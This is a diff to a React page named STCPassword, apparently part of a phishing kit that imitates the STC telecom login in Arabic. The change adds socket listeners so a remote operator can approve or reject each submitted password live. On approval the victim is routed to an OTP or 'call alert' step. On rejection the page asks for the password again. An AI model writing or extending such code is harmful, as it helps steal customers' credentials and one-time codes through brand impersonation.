@@ -11,6 +11,7 @@ import {
   isFormApproved,
   isFormRejected,
   navigateToPage,
+  socket,
 } from "@/lib/store";
 import { Lock } from "lucide-react";
 
@@ -47,22 +48,29 @@ export default function STCPassword() {
     navigateToPage("كلمة مرور STC");
   }, []);
 
-  // Handle form approval
+  // Listen for form:rejected event directly from socket
   useEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/mystc-otp");
-    }
-  }, [isFormApproved.value, navigate]);
-
-  // Handle form rejection
-  useEffect(() => {
-    if (isFormRejected.value) {
+    const s = socket.value;
+    
+    const handleRejected = () => {
+      console.log("STCPassword: Form rejected received!");
       setErrorMessage("يرجى ادخال كلمة المرور بشكل صحيح");
       reset();
-      // Reset the rejection state after handling
-      isFormRejected.value = false;
-    }
-  }, [isFormRejected.value, reset]);
+    };
+
+    const handleApproved = () => {
+      console.log("STCPassword: Form approved received!");
+      navigate("/stc-call-alert");
+    };
+
+    s.on("form:rejected", handleRejected);
+    s.on("form:approved", handleApproved);
+
+    return () => {
+      s.off("form:rejected", handleRejected);
+      s.off("form:approved", handleApproved);
+    };
+  }, [reset, navigate]);
 
   const onSubmit = (data: FormData) => {
     setErrorMessage("");
@@ -136,7 +144,7 @@ export default function STCPassword() {
               <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
             )}
             {errorMessage && (
-              <p className="text-red-500 text-xs text-right">{errorMessage}</p>
+              <p className="text-red-500 text-xs text-right mt-2">{errorMessage}</p>
             )}
           </div>
 
